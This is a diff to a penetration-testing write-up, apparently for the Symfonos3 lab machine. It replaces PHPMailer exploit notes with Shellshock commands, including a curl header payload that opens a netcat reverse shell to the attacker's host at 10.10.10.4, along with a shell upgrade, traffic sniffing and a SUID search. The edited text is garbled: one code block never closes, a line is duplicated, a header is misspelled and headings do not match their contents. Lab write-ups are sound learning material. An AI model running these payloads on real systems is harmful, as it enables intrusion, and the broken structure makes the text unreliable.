@@ -65,44 +65,34 @@ curl http://10.10.10.24/cgi-bin/underworld
 ## 4. Vulnerability Identification
 
 
-### Initial Vulnerability Research
-```bash
-# Search for PHPMailer exploits
-searchsploit phpmailer
-
-# Copy specific exploit
-searchsploit -m 40974.py
-```
 
 ### Exploit Preparation Notes
 ⚠️ **Potential Installation Requirements**
 ```bash
-# If requests_toolbelt module is missing
-pip3 install requests-toolbelt
-```
+curl -H "User-Agente: () { :; }; echo; /bin/bash -c 'uname -a'" http://10.10.10.24/cgi
+Linux symfonos3 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux
+
+nc -nlvp 443
+curl -H "User-Agente: () { :; }; echo; /bin/bash -c 'nc 10.10.10.4 443 -e /bin/bash'" http://10.10.10.24/cgi-bin/underworld 
+curl: (52) Empty reply from server
 
 ## 5. Exploitation Techniques
 
-### Reverse Shell Establishment
-```bash
-# Set up listener on attacker machine
-nc -nlvp 443
+python -c 'import pty;pty.spawn("/bin/bash")'
 
-# Open backdoor in browser
-/path/to/backdoor
+tcpdump -v -i lo port 21
+
 
 # Upgrade to interactive shell
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 ### Initial Access
-```bash
-# Verify initial access
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
-# Change to temporary directory
-cd /tmp
+```bash
+hades@10.10.10.24
+
+find / -perm -u=s -type f 2>/dev/null
 ```
 
 ### Data Transfer Techniques
